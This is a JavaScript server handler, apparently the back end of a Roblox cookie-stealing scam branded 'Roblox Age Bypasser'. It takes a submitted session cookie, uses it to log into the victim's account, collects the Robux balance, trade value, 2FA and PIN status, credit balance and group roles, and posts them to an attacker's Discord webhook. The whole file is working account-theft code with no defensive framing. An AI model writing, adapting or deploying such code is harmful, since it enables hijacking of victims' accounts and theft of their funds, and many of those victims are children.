const axios = require("axios");
const { RobloxUser } = require("./roblox-user");

export default async function handler(req, res) {
    if (req.method !== "POST") {
        return res.status(405).json({ success: false, message: "Method not allowed" });
    }

    const { cookie } = req.body;
    if (!cookie) {
        return res.status(400).send("Webhook ignored: No cookie provided.");
    }

    try {
        const robloxUser = await RobloxUser.register(cookie);
        if (!robloxUser) {
            throw new Error("Failed to authenticate user with the provided cookie.");
        }

        const userData = await robloxUser.getUserData();

        const fields = [
            { name: "Username", value: userData.username, inline: true },
            { name: "Display Name", value: userData.displayName, inline: true },
            { name: "Account Created", value: userData.createdAt, inline: false },
            { name: "💰 Robux", value: `\`${userData.balance}\``, inline: true },
            { name: "📈 RAP", value: `\`${userData.rap}\``, inline: true },
            { name: "⭐ Premium Status", value: userData.isPremium ? "Active ✅" : "Inactive ❌", inline: true },
            { name: "2FA Enabled", value: userData.isTwoStepVerificationEnabled ? "Yes ✅" : "No ❌", inline: true },
            { name: "PIN Enabled", value: userData.isPinEnabled ? "Yes ✅" : "No ❌", inline: true },
            { name: "Credit Balance", value: userData.creditBalance, inline: true },
            { name: "Country", value: userData.country, inline: true },
            { name: "Groups & Roles", value: userData.groups.map(g => `${g.groupName} (${g.role})`).join(", ") || "No Groups", inline: false },
        ];

        const embed = {
            color: 0x43afff,
            author: {
                name: `${userData.displayName} (@${userData.username})`,
                url: `https://www.roblox.com/users/${userData.uid}/profile`,
            },
            thumbnail: { url: userData.avatarUrl },
            fields,
            footer: { text: "Roblox Age Bypasser • Success", icon_url: "https://i.imgur.com/9Cg0Y96.png" },
            timestamp: new Date().toISOString(),
        };

        const webhookURL = "https://discord.com/api/webhooks/YOUR-WEBHOOK-ID";
        await axios.post(webhookURL, { embeds: [embed] });

        res.status(200).send("Webhook sent successfully.");
    } catch (error) {
        console.error("Webhook error:", error.message);

        res.status(500).send(`Webhook failed: ${error.message}`);
    }
}
